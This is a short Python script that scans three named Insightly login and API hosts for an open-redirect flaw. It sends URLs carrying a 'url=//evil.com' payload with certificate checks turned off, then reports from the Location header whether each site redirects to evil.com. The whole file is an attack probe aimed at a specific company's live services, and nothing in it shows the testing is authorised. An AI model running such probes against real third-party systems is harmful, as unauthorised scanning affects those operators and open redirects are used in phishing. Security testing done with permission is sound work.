import requests
import urllib3

urllib3.disable_warnings()

def test_redirect(url):
    print(f"\n[*] Testing: {url}")
    try:
        # Don't follow redirects so we can inspect the Location header
        r = requests.get(url, verify=False, allow_redirects=False, timeout=10)
        
        print(f"  [+] Status Code: {r.status_code}")
        
        if r.is_redirect:
            location = r.headers.get("Location", "")
            print(f"  [+] Location Header: {location}")
            
            # Check if it successfully redirected to evil.com
            if "evil.com" in location:
                # Is it just in the URL query string, or is it the actual host?
                from urllib.parse import urlparse
                parsed = urlparse(location)
                if parsed.netloc == "evil.com" or parsed.netloc.endswith(".evil.com"):
                    print("  [!] VULNERABLE: Direct Open Redirect to evil.com!")
                else:
                    print("  [-] False Positive: 'evil.com' is in the path or query parameters, not the actual host.")
            else:
                print("  [-] Not Vulnerable: Did not redirect to evil.com.")
        else:
            print("  [-] Not Vulnerable: No redirect occurred.")
            
    except Exception as e:
        print(f"  [-] Error: {e}")

if __name__ == "__main__":
    targets = [
        "https://login.insightly.com?url=//evil.com",
        "https://api.na1.insightly.com/v3.1?url=//evil.com",
        "https://crm.na1.insightly.com?url=//evil.com"
    ]
    
    for t in targets:
        test_redirect(t)
